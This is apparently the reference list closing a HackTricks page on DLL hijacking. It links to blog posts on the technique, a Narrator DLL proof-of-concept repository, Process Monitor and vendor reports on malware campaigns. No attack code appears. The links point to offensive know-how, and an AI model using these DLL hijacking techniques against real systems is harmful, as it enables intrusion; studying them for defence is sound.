- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
